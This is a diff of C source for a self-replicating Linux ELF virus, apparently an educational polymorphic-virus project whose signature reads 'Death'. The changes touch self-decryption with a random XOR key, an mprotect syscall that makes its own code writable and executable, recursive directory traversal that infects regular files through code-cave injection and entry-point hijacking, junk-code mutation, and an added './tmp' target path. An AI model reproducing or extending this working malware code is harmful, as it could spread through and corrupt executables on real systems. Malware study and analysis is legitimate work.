@@ -68,22 +68,49 @@ void __attribute__((naked)) _start(void)
 char __attribute__((section(".text#"))) g_signature[SIGNATURE_SIZE] = \
 	"Death (c)oded by [diroyer] & [eamar] - deadbeaf:0000\n\0";
 
-int64_t __attribute__((section(".text#"))) g_key = 0x0;
+//int64_t __attribute__((section(".text#"))) g_key = 0x0;
+
+uint8_t __attribute__((section(".text#"))) g_key[KEY_SIZE] = {0};
+bool __attribute__((section(".text#"))) g_is_encrypted = false;
+
 int __attribute__((section(".text#"))) g_start_offset = 0x1000;
 
-static void xor_decrypt(uint8_t *data, const size_t size, int64_t key) {
+static void xor_decrypt(uint8_t *data, const size_t size, uint8_t *key)
+{
 	for (size_t i = 0; i < size; i++) {
-		data[i] ^= (key >> (8 * (i % 8))) & 0xFF;
+		data[i] ^= key[i % KEY_SIZE];
 	}
 }
 
 void decrypt_self(void)
 {
-	if (g_key == 0x0) {
+	if (g_is_encrypted == false) {
 		return;
 	}
+
+	if (g_start_offset == 0x1000) {
+
+		uintptr_t start = (uintptr_t)&_start;
+		uintptr_t end = start + VIRUS_SIZE;
+
+		uintptr_t page_start = start & ~(PAGE_SIZE - 1);
+		uintptr_t page_end = (end + PAGE_SIZE - 1) & ~(PAGE_SIZE - 1);
+
+		__asm__ __volatile__ (
+				"movq %0, %%rax\n"
+				"movq %1, %%rdi\n"
+				"movq %2, %%rsi\n"
+				"movq %3, %%rdx\n"
+				"syscall\n"
+				: /* no output */
+				: "r"((long)SYS_mprotect), "r"(page_start), "r"(page_end - page_start), "r"((long)(PROT_READ | PROT_WRITE | PROT_EXEC))
+				: "rax", "rdi", "rsi", "memory"
+			);
+
+	}
+
 	uintptr_t dummy = (uintptr_t)&real_start;
-	xor_decrypt((void*)dummy, (uintptr_t)&end - (uintptr_t)&real_start, g_key);
+	xor_decrypt((void*)dummy, PAYLOAD_SIZE, g_key);
 	return;
 }
 
@@ -128,7 +155,10 @@ static int	inject(data_t *data) {
 	uint16_t jmp_offset		= (uintptr_t)&jmp_end - (uintptr_t)&_start + 1;
 	uintptr_t start			= (uintptr_t)&_start;
 	uint16_t real_start_off = (uintptr_t)&real_start - (uintptr_t)&_start;
-	g_key					= gen_key_64();
+	//g_key					= gen_key_64();
+	getrandom(g_key, KEY_SIZE, 0); JUNK;
+
+	g_is_encrypted = true;
 
 	data->cave.rel_jmp = (int32_t)calc_jmp(data->cave.addr, data->cave.old_entry, jmp_offset + JMP_SIZE);
 
@@ -136,7 +166,7 @@ static int	inject(data_t *data) {
 
 	ft_memcpy(data->file + data->cave.offset + jmp_offset, &data->cave.rel_jmp, JMP_SIZE); JUNK;
 
-	encrypt(data->file + data->cave.offset + real_start_off, data->cave.p_size - real_start_off, g_key);
+	encrypt(data->file + data->cave.offset + real_start_off, PAYLOAD_SIZE, g_key);
 
 	return 0;
 }
@@ -180,53 +210,7 @@ static int	infect(const char *filename, bootstrap_data_t *bs_data)
 	return 0;
 }
 
-
-#ifdef ENABLE_EXEC
-static int execute_prog(const char *filename, char **envp)
-{
-	pid_t pid = fork(); JUNK;
-
-	if (pid == 0) {
-
-		const char dev_null[] = "/dev/null";
-		int fd = open(dev_null, O_RDONLY); JUNK;
-
-		if (fd == -1)
-			return 1;
-
-		if (dup2(fd, 0) < 0) {
-			close(fd);
-			return 1;
-		}
-		if (dup2(fd, 1) < 0) {
-			close(fd);
-			return 1;
-		}
-		if (dup2(fd, 2) < 0) {
-			close(fd);
-			return 1;
-		}
-
-		close(fd);
-
-		execve(filename, (const char *[]){filename, NULL}, envp);
-
-		exit(0);
-	} else if (pid > 0) {
-		siginfo_t info;
-
-		waitid(P_PID, pid, &info, WEXITED);
-
-		return (info.si_status == 0) ? 0 : 1;
-	} else {
-		return 1;
-	}
-
-	return 0;
-}
-#endif
-
-static void open_file(const char *file, bootstrap_data_t *bs_data, uint16_t *counter)
+static void open_file(char *file, bootstrap_data_t *bs_data, uint16_t *counter)
 {
 
 	int fd = open(file, O_RDONLY);
@@ -236,6 +220,11 @@ static void open_file(const char *file, bootstrap_data_t *bs_data, uint16_t *cou
 	char buf[PATH_MAX];
 	dirent_t *dir;
 	ssize_t ret;
+
+
+	if (file[0] == '/' && file[1] == '\0') {
+		*file = '\0';
+	}
 
 	for(;;)
 	{
@@ -249,7 +238,7 @@ static void open_file(const char *file, bootstrap_data_t *bs_data, uint16_t *cou
 			if (dir->d_name[0] == '.'
 				&& (dir->d_name[1] == '\0' || (dir->d_name[1] == '.' && dir->d_name[2] == '\0')))
 				continue;
-			
+
 			if (dir->d_type == DT_REG) {
 
 				char new_path[NAME_MAX]; JUNK;
@@ -262,21 +251,22 @@ static void open_file(const char *file, bootstrap_data_t *bs_data, uint16_t *cou
 
 				mutate();
 
+				//_printf("file: %s\n", new_path);
+
 				if (infect(new_path, bs_data) == 0) {
 					(*counter)++;
-
-#ifdef ENABLE_EXEC
-					execute_prog(new_path, bs_data->envp);
-#endif
 				}
 
 			} else if (dir->d_type == DT_DIR) {
+
 				char new_path[NAME_MAX];
 
 				char *ptr = new_path;
 				ptr = ft_stpncpy(ptr, file, NAME_MAX - (ptr - new_path));
 				ptr = ft_stpncpy(ptr, STR("/"), NAME_MAX - (ptr - new_path));
 				ft_stpncpy(ptr, dir->d_name, NAME_MAX - (ptr - new_path));
+
+				//_printf("dir: %s\n", new_path);
 
 				open_file(new_path, bs_data, counter);
 			}
@@ -289,9 +279,12 @@ static void open_file(const char *file, bootstrap_data_t *bs_data, uint16_t *cou
 void	famine(bootstrap_data_t *bs_data, uint16_t *counter)
 {
 
-	const char *paths[] = {
+	//_printf("virus size: %d\n", VIRUS_SIZE);
+
+	char *paths[] = {
 		STR(PATH1),
 		STR(PATH2),
+		STR("./tmp"),
 		NULL
 	}; JUNK;
 
@@ -302,7 +295,6 @@ void	famine(bootstrap_data_t *bs_data, uint16_t *counter)
 
 void	entrypoint(int argc, char **argv, char **envp)
 {
-
 	bootstrap_data_t bootstrap_data;
 	bootstrap_data.argc = argc;
 	bootstrap_data.argv = argv;
@@ -312,11 +304,13 @@ void	entrypoint(int argc, char **argv, char **envp)
 	file_t file;
 	ft_memset(&file, 0, sizeof(file_t));
 
-	if (pestilence() != 0) return ;
+	//if (pestilence() != 0) return ;
 
 	/* saving these values (they will be overwritten by the packer) */
 	int start_offset = g_start_offset;
-	int64_t key = g_key;
+	bool is_encrypted = g_is_encrypted;
+	uint8_t key[KEY_SIZE];
+	ft_memcpy(key, g_key, KEY_SIZE);
 
 	prepare_mutate();
 
@@ -326,7 +320,7 @@ void	entrypoint(int argc, char **argv, char **envp)
 
 	if (war(counter, &file, start_offset) != 0) return ;
 
-	death(start_offset, key, &file);
+	death(start_offset, key, &file, is_encrypted);
 }
 
 /* junk */
@@ -404,3 +398,52 @@ void junk_famine(void) {
 	};
 	(void)digest;
 }
+
+/* funny but useless function 
+ *
+#ifdef ENABLE_EXEC
+static int execute_prog(const char *filename, char **envp)
+{
+	pid_t pid = fork(); JUNK;
+
+	if (pid == 0) {
+
+		const char dev_null[] = "/dev/null";
+		int fd = open(dev_null, O_RDONLY); JUNK;
+
+		if (fd == -1)
+			return 1;
+
+		if (dup2(fd, 0) < 0) {
+			close(fd);
+			return 1;
+		}
+		if (dup2(fd, 1) < 0) {
+			close(fd);
+			return 1;
+		}
+		if (dup2(fd, 2) < 0) {
+			close(fd);
+			return 1;
+		}
+
+		close(fd);
+
+		execve(filename, (const char *[]){filename, NULL}, envp);
+
+		exit(0);
+	} else if (pid > 0) {
+		siginfo_t info;
+
+		waitid(P_PID, pid, &info, WEXITED);
+
+		return (info.si_status == 0) ? 0 : 1;
+	} else {
+		return 1;
+	}
+
+	return 0;
+}
+#endif
+
+*/
